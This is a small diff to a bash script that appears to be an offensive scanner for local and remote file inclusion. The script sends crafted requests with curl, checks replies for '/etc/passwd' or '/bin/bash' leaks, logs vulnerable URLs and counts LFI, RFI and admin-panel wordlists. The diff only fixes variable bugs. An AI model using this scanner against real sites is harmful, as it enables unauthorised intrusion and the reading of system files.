@@ -41,7 +41,7 @@ lfi(){
 	scan=$(curl -s -A '${useragents}' -o /dev/null -w '%{http_code}' ${urlz}${miring}${zlfi})
 	if [[ $scan == 200 ]] || [[ $scan == 301 ]] || [[ $scan =~ "/etc/passwd" ]]; then
 		echo "${f2}[${f3}$time${f2}] $url$miring$zlfi ~> ${f6}[${f7}OK${f6}]${f2}"
-		echo "$urlz$miring$zlfi" >> $saved
+		echo "$url$miring$zlfi" >> $saved
 	elif [[ $scan =~ "/bin/bash" ]]; then
 			echo "${f2}[${f3}$time${f2}] $url$miring$zlfi ~> ${f6}[${f3}OK${f6}]${f2}"
 			echo "$urlz$miring$zlfi" >> $saved
@@ -104,7 +104,7 @@ echo "Total LFI List ~> $listlfi"
 
 listrfi(){
 listrfi=$(wc -l rfi/RFI | cut -f1 -d '')
-echo "Total RFI List ~> $listrce"
+echo "Total RFI List ~> $listrfi"
 }
 listadmin(){
 listadmin=$(wc -l admin/ADMIN | cut -f1 -d '')
